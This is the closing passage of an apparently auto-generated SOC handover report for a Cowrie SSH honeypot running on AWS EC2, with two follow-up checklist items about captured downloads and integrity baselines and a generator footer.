- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-24T17:07:21Z_
